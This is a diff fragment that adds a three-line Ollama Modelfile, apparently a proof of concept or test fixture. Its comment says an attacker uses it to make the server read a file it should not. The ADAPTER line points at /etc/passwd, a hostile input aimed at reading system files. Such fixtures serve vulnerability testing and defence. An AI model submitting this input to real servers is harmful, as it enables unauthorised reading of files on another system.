@@ -1,0 +1,3 @@
+# The attacker creates a Modelfile designed to trick the Ollama server into reading a file it should not.
+FROM smollm2:135m
+ADAPTER /etc/passwd
